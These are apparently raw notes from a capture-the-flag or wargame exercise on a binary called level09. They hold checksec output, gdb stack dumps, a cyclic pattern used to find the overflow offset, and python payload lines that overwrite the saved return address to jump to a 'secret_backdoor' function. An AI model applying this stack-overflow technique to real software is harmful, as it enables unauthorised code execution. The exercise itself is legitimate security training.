RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09


(gdb) p secret_backdoor 
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>

in main; saved rip 0x7ffff7a3d7ed

in handle_msg; saved rip 0x555555554abd

b *handle_msg+112

(gdb) x/64wx $rsp
0x7fffffffe3e0: 0x65413265      0x34654133      0x41356541      0x65413665
0x7fffffffe3f0: 0x38654137      0x41396541      0x66413066      0x32664131
0x7fffffffe400: 0x41336641      0x66413466      0x36664135      0x41376641
0x7fffffffe410: 0x66413866      0x30674139      0x41316741      0x67413267
0x7fffffffe420: 0x34674133      0x41356741      0x67413667      0x38674137
0x7fffffffe430: 0x41396741      0x68413068      0x32684131      0x41336841
0x7fffffffe440: 0x00003468      0x00000000      0x55554c10      0x00005555
0x7fffffffe450: 0xffffe590      0x00007fff      0xf7a95d45      0x00007fff
0x7fffffffe460: 0xf7dd4260      0x00007fff      0xf7a9608f      0x41306141
0x7fffffffe470: 0x61413161      0x33614132      0x41346141      0x61413561
0x7fffffffe480: 0x37614136      0x41386141      0x62413961      0x31624130
0x7fffffffe490: 0x41326241      0x00000062      0xffffe4b0      0x00007fff
0x7fffffffe4a0: 0xffffe4b0      0x00007fff      0x55554abd      0x00005555
0x7fffffffe4b0: 0x00000000      0x00000000      0xf7a3d7ed      0x00007fff
0x7fffffffe4c0: 0x00000000      0x00000000      0xffffe598      0x00007fff
0x7fffffffe4d0: 0x55554000      0x00000001      0x55554aa8      0x00005555

<+112>
<+217>

<+148>
<+153>

126 : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1

(gdb) find 0x7ffffffde000, +135168, 0x41306141
0x7fffffffe350
0x7fffffffe47c

0x00007fffffffe3f0

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B

python -c 'print "A"*40' ; python -c 

r < <(python -c 'print "\x90"*41' ; python -c 'print "\x90"*128 + "\x8c\x48\x55\x55\x55\x55\x00\x00"')

< <(python -c 'print "A"*40' ; python -c 'print "\x8c\x48\x55\x55\x55\x55\x00\x00"')

0x55 55 55 55 48 8c

\x8c\x48\x55\x55\x55\x55\x00\x00

0x7fffffffe025

0x7fffffffe4a1


handle_msg() = rbp-0xc0 = 0x7fffffffe3f0

set_username()
x $rbp-0x98
0x7fffffffe348: 0x00007fffffffe3f0

set_msg()
x $rbp-0x408
0x7fffffffdfd8: 0x00007fffffffe3f0